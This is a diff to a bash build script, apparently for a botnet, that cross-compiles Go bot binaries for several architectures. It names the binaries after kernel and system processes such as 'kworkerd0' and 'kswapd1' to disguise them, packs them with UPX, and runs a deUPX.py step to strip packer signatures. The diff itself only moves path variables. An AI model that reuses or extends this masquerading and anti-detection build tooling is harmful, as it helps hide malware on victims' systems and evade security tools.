@@ -4,9 +4,10 @@
 # yes we are using UPX (GO is large) if you want to remove the strings from the binaries you can use my tool here
 #  https://github.com/Syn2Much/upx-stripper
 
-# Get the directory where this script is located (project root)
+# Get the directory where this script is located (tools/)
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-BOT_DIR="$SCRIPT_DIR/bot"
+# Project root is one level up from tools/
+PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
 
 # Array of binary names to use for obfuscation (disguised as kernel/system processes)
 AMBS=("kworkerd0" "ethd0" "mdsync1" "ksnapd0" "kswapd1"
@@ -14,7 +15,7 @@ AMBS=("kworkerd0" "ethd0" "mdsync1" "ksnapd0" "kswapd1"
       "ttmswapd" "vredisd0" "kvmirqd")
 
 # Create bins folder in project root if it doesn't exist
-BINS_DIR="$SCRIPT_DIR/bins"
+BINS_DIR="$PROJECT_ROOT/bins"
 mkdir -p "$BINS_DIR"
 
 # Counter for AMBS array
@@ -29,9 +30,9 @@ build_for_arch() {
     
     echo -e "\nBuilding for $arch_name..."
     
-    local OUTPUT="$SCRIPT_DIR/${AMBS[$INDEX]}"
+    local OUTPUT="$PROJECT_ROOT/${AMBS[$INDEX]}"
     
-    cd "$SCRIPT_DIR"
+    cd "$PROJECT_ROOT"
     
     if [ -n "$goarm" ]; then
         # ARM architectures require GOARM setting
@@ -105,9 +106,9 @@ ls -la "$BINS_DIR/"
 
 # Strip UPX signatures from packed binaries using deUPX.py
 echo -e "\nStripping UPX signatures from binaries..."
-if [ -f "$BOT_DIR/deUPX.py" ]; then
-    python3 "$BOT_DIR/deUPX.py" "$BINS_DIR/"
+if [ -f "$SCRIPT_DIR/deUPX.py" ]; then
+    python3 "$SCRIPT_DIR/deUPX.py" "$BINS_DIR/"
     echo -e "\nUPX signatures stripped successfully!"
 else
-    echo "WARNING: deUPX.py not found at $BOT_DIR/deUPX.py - skipping UPX stripping"
+    echo "WARNING: deUPX.py not found at $SCRIPT_DIR/deUPX.py - skipping UPX stripping"
 fi
